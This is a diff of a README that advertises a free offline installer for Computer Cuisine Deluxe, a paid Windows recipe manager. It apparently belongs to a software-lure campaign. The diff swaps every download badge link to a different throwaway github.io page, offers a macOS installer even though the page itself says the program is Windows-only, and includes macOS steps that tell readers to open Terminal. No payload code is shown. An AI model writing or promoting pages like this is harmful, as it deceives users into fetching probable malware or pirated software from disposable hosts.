@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Recipe+Management-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Recipe+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Computer Cuisine Deluxe Free Installer** — Computer Cuisine Deluxe is a Windows recipe management and meal planning application for home cooks. Works without internet access, no account required. Full offline installation.
+**💻 Computer Cuisine Deluxe Free Installer** — Computer Cuisine Deluxe is a Windows recipe management and meal planning software for organizing personal recipe collections. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Computer Cuisine Deluxe](https://img.shields.io/badge/⬇_Install_Computer+Cuisine+Deluxe-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Computer Cuisine Deluxe](https://img.shields.io/badge/⬇_Install_Computer+Cuisine+Deluxe-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Computer Cuisine Deluxe
 
-Computer Cuisine Deluxe is a Windows recipe management and meal planning application for home cooks. Store hundreds of recipes with photos, nutritional information, and cooking notes. Plan weekly menus, generate shopping lists from planned meals, and scale recipes up or down for different serving sizes. Computer Cuisine Deluxe brings organization to home cooking and grocery planning.
+Computer Cuisine Deluxe is a Windows recipe management and meal planning software for organizing personal recipe collections. It supports nutritional analysis, shopping list generation, and meal calendar planning for household cooking management.
 
 ---
 
 ## ❌ Problem: Computer Cuisine Deluxe is hard to access
 
-- **Windows Only** — No macOS or cross-platform version
-- **Dated Software** — Limited recent development and updates
-- **Mobile Integration** — No companion mobile app for kitchen use
-- **Online Recipe Import** — Limited ability to import recipes from websites
+- **Windows Only** — No macOS or Linux version
+- **Outdated Software** — Development appears to have stopped; no recent updates
+- **Declining Market** — Web-based recipe managers and apps have largely replaced desktop software
+- **Paid License** — Requires purchase for a product with uncertain maintenance
 
 ---
 
@@ -61,9 +61,9 @@ Computer Cuisine Deluxe is a Windows recipe management and meal planning applica
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Computer Cuisine Deluxe is a Windows recipe management and meal planning applica
 
 <div align="center">
 
-[![⬇ Install Computer Cuisine Deluxe](https://img.shields.io/badge/⬇_Install_Computer+Cuisine+Deluxe-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Computer Cuisine Deluxe](https://img.shields.io/badge/⬇_Install_Computer+Cuisine+Deluxe-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Computer Cuisine Deluxe is a Windows recipe management and meal planning applica
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Computer Cuisine Deluxe is a Windows recipe management and meal planning applica
 
 ---
 
-**Computer Cuisine Deluxe Free Installer** — Computer Cuisine Deluxe is a Windows recipe management and meal planning application for home cooks. Install without internet connection today!
+**Computer Cuisine Deluxe Free Installer** — Computer Cuisine Deluxe is a Windows recipe management and meal planning software for organizing personal recipe collections. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Computer Cuisine Deluxe](https://img.shields.io/badge/⬇_Install_Computer+Cuisine+Deluxe-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Computer Cuisine Deluxe](https://img.shields.io/badge/⬇_Install_Computer+Cuisine+Deluxe-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
